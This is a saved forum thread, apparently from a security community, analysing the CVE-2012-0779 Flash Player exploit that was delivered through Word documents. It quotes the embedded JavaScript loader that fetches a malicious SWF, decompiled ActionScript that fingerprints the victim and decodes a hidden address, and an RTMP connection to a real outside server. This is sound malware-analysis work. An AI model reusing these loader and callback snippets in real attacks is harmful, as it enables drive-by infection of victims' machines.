+pd[7745] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_7745">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">05-11-2012,&nbsp;<span class="time">09:35 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post7745" href="showthread.php?t=2300&amp;p=7745&amp;viewfull=1#post7745" class="postcounter">#3</a><a id="postcount7745" name="3"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_7745_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_7745">\r\n						<blockquote class="postcontent restore ">\r\n							This is again a brief analysis. There are a lot of functions defined in the ActionScript, so to make it easier for analysis, I will present the flow.<br />\r\n<br />\r\nStart tracing from within function, v25()<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:216px;">        public function v25():void{\r\n            var _local1:String;\r\n            this.v11 = this.v40();\r\n            this.v12 = this.v41();\r\n            if ((((this.v12 == &quot;windows 7&quot;)) || ((this.v12 == &quot;windows xp&quot;)))){\r\n                if (this.v11 == &quot;win 10,1,52,14&quot;){\r\n                    return;\r\n                };\r\n                _local1 = this.v67();\r\n                this.v51(_local1);\r\n                this.v14 = this.v70();\r\n                this.v42(this.v14);\r\n            } else {\r\n                return;\r\n            };\r\n        }</pre>\r\n</div>1. A function call to v40() is made.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">this.v11 = this.v40();</pre>\r\n</div><div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:84px;">        public function v40():String{\r\n            var _local1:String = new String();\r\n            _local1 = Capabilities.version.toLowerCase();\r\n            return (_local1);\r\n        }</pre>\r\n</div>It will return the version of Flash Player using the Capabilities.version method. This will return the result as &quot;win 10,3,183,10&quot;. It means that the Flash Player version is 10.3.183.10<br />\r\n<br />\r\n2. A function call to v41() is made.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">this.v12 = this.v41();</pre>\r\n</div>It will return the version of Operating System on which the Flash Player is running using the Capabilities.os method<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:84px;">        public function v41():String{\r\n            var _local1:String = new String();\r\n            _local1 = Capabilities.os.toLowerCase();\r\n            return (_local1);\r\n        }</pre>\r\n</div>3. It checks whether the OS is windows 7 or windows xp and proceeds, else returns. It also checks whether the version is = 10.1.52.14 in which case it again returns.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:72px;">            if ((((this.v12 == &quot;windows 7&quot;)) || ((this.v12 == &quot;windows xp&quot;)))){\r\n                if (this.v11 == &quot;win 10,1,52,14&quot;){\r\n                    return;\r\n                };</pre>\r\n</div>4. Uses v67() function to retrieve the infosize parameter value which was passed in the URL.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">_local1 = this.v67();</pre>\r\n</div><div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:84px;">        public function v67():String{\r\n            var _local1:Object = root.loaderInfo[&quot;@doswf__p&quot;];\r\n            var _local2:String = _local1[&quot;infosize&quot;];\r\n            return (_local2);\r\n        }</pre>\r\n</div>The value of the infosize parameter is the same as what was passed in the URL set in embed tag\'s src attribute.<br />\r\n<br />\r\n5. Uses v70() function to retrieve the info hash which was passed in the URL and also decodes it.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">this.v14 = this.v70();</pre>\r\n</div>I have taken the appropriate code snippets from the original ActionScript to decode the hash. AS3 Eval Library was used to interpret the code.<br />\r\n<br />\r\nNotice the hash value set in _local2 variable.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">namespace fu = &quot;flash.utils&quot;; \r\nuse namespace fu;\r\n\r\npublic class LookAClass {\r\n	public function LookAClass() {\r\n		Util.print(v70());\r\n	}\r\n	        public function v50(_arg1:String):ByteArray{\r\n            var _local2:String;\r\n            var _local3:ByteArray = new ByteArray();\r\n            var _local4:uint = _arg1.length;\r\n            var _local5:uint;\r\n            _local3.endian = Endian.LITTLE_ENDIAN;\r\n            while (_local5 &lt; _local4) {\r\n                _local2 = (_arg1.charAt(_local5) + _arg1.charAt((_local5 + 1)));\r\n                _local3.writeByte(parseInt(_local2, 16));\r\n                _local5 = (_local5 + 2);\r\n            };\r\n            return (_local3);\r\n        }\r\n\r\n        public function v70():String{\r\n            var _local2:String = &quot;789c333230d13331d53337d633b3b432313106001afa0338&quot;;\r\n            var _local3:ByteArray = this.v50(_local2);\r\n            var _local4:uint;\r\n            _local4 = 0;\r\n            while (_local4 &lt; _local3.length) {\r\n                _local3[_local4] = (_local3[_local4] ^ 0);\r\n                _local4++;\r\n            };\r\n            _local3.uncompress();\r\n            var _local5:String = String(_local3);\r\n            return (_local5);\r\n        }\r\n}\r\nnew LookAClass;</pre>\r\n</div>The result:<br />\r\n<br />\r\n<img src="http://garage4hackers.com/attachment.php?attachmentid=362&amp;d=1336752172" border="0" alt="Name:  fbu8H.png\r\nViews: 835\r\nSize:  15.6 KB"  style="float: CONFIG" /><br />\r\n<br />\r\nThe decoded value gives the IP Address and Port Number. It is the IP Address of the same URL which was referenced in the src attribute of embed tag. The SWF file is hosted on the server with the same IP Address.<br />\r\n<br />\r\n6. It passes the above decoded value to function, v42()<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:48px;">                this.v14 = this.v70();\r\n                this.v42(this.v14);</pre>\r\n</div>7. It creates a NetConnection object and connects to the Flash Media Server with the following URL:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:36px;">rtmp://204.45.73.69:443/TSGeneralSetting</pre>\r\n</div><div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:120px;">        public function v42(_arg1:String):void{\r\n            this.v15 = new NetConnection();\r\n            var _local2 = &quot;rtmp://&quot;;\r\n            var _local3 = &quot;/TSGeneralSetting&quot;;\r\n            var _local4:String = ((_local2 + _arg1) + _local3);\r\n            this.v15.connect(_local4);\r\n            this.v15.call(&quot;systemMemoryCall&quot;, this.v16, &quot;argc&quot;);\r\n        }</pre>\r\n</div>It calls the <b>systemMemoryCall</b> method defined in the server side script and passes it an argument called <b>argc</b><br />\r\n<br />\r\nv16 is the Responder Object which is used to handle the return value from the server method, systemMemoryCall\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_7745" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_7745" class="newreply" href="newreply.php?do=newreply&amp;p=7745" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7745" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+
+// next/previous post info
+pn[7743] = "7745,7744";
+pn[0] = ",7743";
+pn[7744] = "7743,7745";
+pn[7745] = "7744,7743";
+
+// cached usernames
+pu[0] = guestphrase;
+pu[311] = "c0d3inj3cT";
+pu[16] = "41.w4r10r";
+
+// -->
+</script>
+
+
+<div id="threaded_view">
+	<h4>Threaded View</h4>
+
+	<div id="posttree">
+		<script type="text/javascript">
+		<!--
+			writeLink(7743, 0, 0, 311, "", "CVE-2012-0779 - Flash Player...", "05-11-2012", "09:08 PM", 0, "showthreadc951-2.html?t=2300&amp;p=7743#post7743");
+  writeLink(7744, 0, 0, 16, "T", "<i>Waiting to see length of your...</i>", "05-11-2012", "09:24 PM", 0, "showthreadb30a-2.html?t=2300&amp;p=7744#post7744");
+  writeLink(7745, 0, 0, 311, "L", "<i>This is again a brief...</i>", "05-11-2012", "09:35 PM", 0, "showthreada725.html?t=2300&amp;p=7745#post7745");
+
+		//-->
+		</script>
+	</div>
+</div>
+	
+
+	
+		<ol id="posts" class="posts" start="1">
+			
+<li class="postbitlegacy postbitim postcontainer old" id="post_7743">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">05-11-2012,&nbsp;<span class="time">09:08 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post7743" href="showthread93cd.html?t=2300&amp;p=7743&amp;viewfull=1#post7743" class="postcounter">#1</a><a id="postcount7743" name="1"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberdb73.html?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberdb73.html?u=311" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="search9737.html?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="private1fcf.html?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogdb73.html?u=311" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list1ee8.html?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="c0d3inj3cT is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Garage Member
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_7743_311" title="c0d3inj3cT will become famous soon enough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Dec 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>67</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogdb73.html?u=311">2</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow">
+				
+				
+				<h2 class="title icon">
+					CVE-2012-0779 - Flash Player Exploit
+				</h2>
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_7743">
+						<blockquote class="postcontent restore ">
+							This is regarding a latest Flash Player Exploit which is being used in the wild, mostly being served to victims in the form of Word Documents.<br />
+<br />
+A brief overview before we get to the good stuff:<br />
+<br />
+A Word Document has the following malicious JavaScript embedded in it:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">javascript<b></b>:eval(document.write(unescape('%3Cembed%20src%3Dhttp://example.com/malicious.swf?info=&lt;48 Char Hash&gt;&amp;infosize=&lt;A Dword&gt;%3E%3C/embed%3E')))</pre>
+</div>This JavaScript can easily be located by viewing the strings of the Word Document. It is encoded but it should be easy to follow that it creates an embed tag as following:<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:36px;">&lt;embed src=&quot;http://example.com/malicious.swf?info=&lt;48 Char Hash&gt;&amp;infosize=&lt;A Dword&gt;&quot;&gt;&lt;/embed&gt;</pre>
+</div>Apart from the above malicious JavaScript, you will also find a payload present inside the Word Document. The MZ and PE Signatures are XOR Encrypted using a Byte. It can be easily retrieved using OfficeMalScanner.<br />
+<br />
+It will bruteforce the XOR Key and dump the embedded payload. You may find only 1 binary or even multiple binaries.<br />
+<br />
+When you open the MS Word Document, it will connect to the URL mentioned in the SRC Attribute of the Embed tag and fetch a SWF File. This in turn will spray the Process Heap with shellcode and trigger the vulnerability in Flash Player, thereby redirecting the execution to shellcode sprayed over the heap.<br />
+<br />
+This shellcode will locate the payload present inside the Word Document.<br />
+<br />
+Now, let's focus on the SWF file. You can fetch a SWF File from Contagio here:<br />
+<br />
+<a href="../external.html?link=http://contagiodump.blogspot.in/2012/05/may-3-cve-2012-0779-world-uyghur.html" target="_blank">http://contagiodump.blogspot.in/2012...ld-uyghur.html</a><br />
+<br />
+Thanks Mila <img src="images/smilies/smile.html" border="0" alt="" title="Smile" class="inlineimg" /><br />
+<br />
+The SWF file is compressed as you can see from the magic bytes (CWS).<br />
+<br />
+It is also encrypted using DoSWF version 5.0.3. This information can be found in the RDF Metadata of the decompressed SWF File.<br />
+<br />
+The decompiled ActionScript is posted on Contagio. It's time to deep dive into the ActionScript.
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_7743" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_7743" class="newreply" href="newreply5c99.html?do=newreply&amp;p=7743" rel="nofollow" title="Reply With Quote"><img id="quoteimg_7743" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+		</ol>
+                <div class="separator"></div>
+		<div class="postlistfoot">
+			
+		</div>
+
+	
+
+</div>
+
+<div id="below_postlist" class="noinlinemod below_postlist">
+	
+	<div id="pagination_bottom" class="pagination_bottom">
+	
+		<div class="clear"></div>
+<div class="navpopupmenu popupmenu nohovermenu" id="showthread_navpopup">
+	
+		<span class="shade">Quick Navigation</span>
+		<a href="showthread8c64.html?t=2300" class="popupctrl"><span class="ctrlcontainer">Reverse Engineering and Application Cracking</span></a>
+		<a href="showthread8c64.html?t=2300#top" class="textcontrol" onclick="document.location.hash='top';return false;">Top</a>
+	
+	<ul class="navpopupbody popupbody popuphover">
+		
+		<li class="optionlabel">Site Areas</li>
+		<li><a href="usercp.html">Settings</a></li>
+		<li><a href="private.html">Private Messages</a></li>
+		<li><a href="subscription.html">Subscriptions</a></li>
+		<li><a href="online.html">Who's Online</a></li>
+		<li><a href="search.html">Search Forums</a></li>
+		<li><a href="forum.html">Forums Home</a></li>
+		
+			<li class="optionlabel">Forums</li>
+			
+		
+			
+				<li><a href="forumdisplay58da.html?f=1">Garage Network</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay12a3.html?f=2">Garage Announcements</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaye57d.html?f=58">Bravo - Null 2012</a></li>
+			
+		
+			
+				<li><a href="forumdisplay0756.html?f=59">Garage Local Chapter Meets</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay31e6.html?f=4">Garage Rules</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye774.html?f=5">Feedback &amp; Suggestions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayd42b.html?f=7">Introduce Your Self</a></li>
+			
+		
+			
+				<li><a href="forumdisplay2b89.html?f=38">Shout-box</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplaycf19.html?f=6">Garage Lounge</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay5579.html?f=30">Hacking for Beginners</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay6ac3.html?f=57">Did You Know?</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay957d.html?f=8">Security &amp; Hacking News Thread</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3215.html?f=36">Career in InfoSec</a></li>
+			
+		
+			
+				<li><a href="forumdisplay814c.html?f=29">Request Zone</a></li>
+			
+		
+			
+				<li><a href="forumdisplay13b6.html?f=27">Noobs Corner</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayfdc5.html?f=9">Hacking and Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplayfac0.html?f=55">Tip | Trick of the Day</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4a6.html?f=66">ICS / SCADA Security</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6111.html?f=67">Internet of Things - IoT</a></li>
+			
+		
+			
+				<li><a href="forumdisplay15ca.html?f=10">Network Vulnerabiltity Assessment &amp; Penetration Testing</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplaya05c.html?f=56">Post Exploitation</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay8a83.html?f=11">Web Application Penetration Testing</a></li>
+			
+		
+			
+				<li><a href="forumdisplay01c9.html?f=12">Wireless and Bluetooth Hacking</a></li>
+			
+		
+			
+				<li><a href="forumdisplay48ab.html?f=17">Computer Forensics and Incident Handling</a></li>
+			
+		
+			
+				<li><a href="forumdisplay218b.html?f=19">Physical Security and Social Engineering</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb09f.html?f=15">General Security &amp; Best Practices</a></li>
+			
+		
+			
+				<li><a href="forumdisplay907f.html?f=42">Security and Hacking Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplay9e0d.html?f=54">Mobile Security</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplay9780.html?f=14">General Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay9df8.html?f=31">Programming</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay65b9.html?f=35">Assembly</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4f1.html?f=32">C/C++</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb0a0.html?f=34">Perl</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb8c1.html?f=60">PHP</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6c4e.html?f=33">Python</a></li>
+			
+		
+			
+				<li><a href="forumdisplay208f.html?f=51">Linux Shell / Bash Programming</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3238.html?f=47">Windows Batch Programming</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayce40.html?f=28">BackTrack and Other Linux Distributions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf2fa.html?f=16">Networks &amp; Networking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya213.html?f=18">Cloud Computing</a></li>
+			
+		
+			
+				<li><a href="forumdisplaydfa4.html?f=39">Security Podcast and Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya3f5.html?f=40">Miscellanous Thread</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay30ac.html?f=49">Brush Up Your Skills</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayffeb.html?f=20">Experts Forum</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplaycdba.html?f=48">My Meanest Hacks</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf6ac.html?f=37">Hacking &amp; Security Books and Tutorials</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8011.html?f=23">Tools &amp; Scripts</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>
+			
+		
+			
+				<li><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye8b3.html?f=25">Botnets, Malwares &amp; Rootkits Analysis</a></li>
+			
+		
+			
+				<li><a href="forumdisplay107e.html?f=43">Garage4hackers Exploits</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye5f3.html?f=64">Browser Fuzzing</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+		
+	</ul>
+</div>
+<div class="clear"></div>
+	</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+<!-- next / previous links -->
+<div class="navlinks">
+	
+	<strong>&laquo;</strong>
+	<a href="showthreadac2f.html?t=2300&amp;goto=nextoldest" rel="nofollow">Previous Thread</a>
+	|
+	<a href="showthread07df.html?t=2300&amp;goto=nextnewest" rel="nofollow">Next Thread</a>
+	<strong>&raquo;</strong>
+	
+</div>
+<!-- / next / previous links -->
+
+<div id="thread_info" class="thread_info">
+	
+	
+	
+	
+	<h4 class="threadinfohead"><span class="optiontitle">Tags for this Thread</span></h4>
+	<div id="thread_tags_list" class="thread_info_block">
+		<div class="inner_block">
+			
+			<div id='tag_list_cell'>
+				
+		
+			<a href="tags526f.html?tag=actionscript">actionscript</a>, 
+		
+			<a href="tags6730.html?tag=flash+player">flash player</a>
+		
+
+<img src="images/misc/11x11progress.html" id="tag_form_progress" class="inlineimg hidden" alt="" />
+			</div>
+			<p>
+				<a href="tags.html">View Tag Cloud</a>
+			</p>
+		</div>
+	</div>
+	
+	<div class="options_block_container">
+		
+		<div class="options_block">
+			<h4 class="collapse">
+				<a class="collapse" id="collapse_posting_rules" href="showthread8c64.html?t=2300#top"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				<span class="optiontitle">Posting Permissions</span>
+			</h4>
+			<div id="posting_rules" class="thread_info_block">
+				
+<div id="forumrules" class="info_subblock">
+
+	<ul class="youcandoblock">
+		<li>You <strong>may not</strong> post new threads</li>
+		<li>You <strong>may not</strong> post replies</li>
+		<li>You <strong>may not</strong> post attachments</li>
+		<li>You <strong>may not</strong> edit your posts</li>
+		<li>&nbsp;</li>
+	</ul>
+	<div class="bbcodeblock">
+		<ul>
+			<li><a href="miscaff0.html?do=bbcode" target="_blank">BB code</a> is <strong>On</strong></li>
+			<li><a href="misc9712.html?do=showsmilies" target="_blank">Smilies</a> are <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#imgcode" target="_blank">[IMG]</a> code is <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#videocode" target="_blank">[VIDEO]</a> code is <strong>On</strong></li>
+			<li>HTML code is <strong>Off</strong></li>
+		</ul>
+	</div>
+	<p class="rules_link"><a href="misc17ec.html?do=showrules" target="_blank">Forum Rules</a></p>
+
+</div>
+
+			</div>
+		</div>
+
+	</div>
+
+</div>
+
+
+
+
+
+<!-- lightbox scripts -->
+	<script type="text/javascript">
+	<!--
+	vBulletin.register_control("vB_Lightbox_Container", "posts", 1);
+	//-->
+	</script>
+<!-- / lightbox scripts -->
+
+
+
+
+<div style="clear: left">
+  
+<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 468;
+google_ad_height = 60;
+google_ad_format = "468x60_as";
+google_ad_type = "text_image";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+  <div id="ad_global_above_footer"><div align="center">
+<script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/9/10 */
+google_ad_slot = "7101394260";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+</div>
+
+<div id="footer" class="floatcontainer footer">
+
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+
+		
+			<select name="styleid" onchange="switch_id(this, 'style')">
+				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
+				
+					
+					<optgroup label="&nbsp;Standard Styles">
+									
+					
+	<option value="1" class="" selected="selected">-- Default Style</option>
+
+					
+					</optgroup>
+										
+				
+				
+					
+					<optgroup label="&nbsp;Mobile Styles">
+					
+					
+	<option value="2" class="" >-- Default Mobile Style</option>
+
+					
+					</optgroup>
+										
+				
+			</select>	
+		
+		
+		
+	</form>
+
+	<ul id="footer_links" class="footer_links">
+		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+		<li><a href="index.html">Garage4hackers</a></li>
+		
+		
+		<li><a href="archive/index.html">Archive</a></li>
+		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		
+		
+		<li><a href="showthread8c64.html?t=2300#top" onclick="document.location.hash='top'; return false;">Top</a></li>
+	</ul>
+	
+	
+	
+	
+	<script type="text/javascript">
+	<!--
+		// Main vBulletin Javascript Initialization
+		vBulletin_init();
+		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
+	//-->
+	</script>
+        
+</div>
+</div> <!-- closing div for body_wrapper -->
+
+<div class="below_body">
+<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">05:51 PM</span>.</div>
+
+<div id="footer_copyright" class="shade footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="shade footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	<img src="cronfa4c.gif?rand=1584879687" alt="" width="1" height="1" border="0" />
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
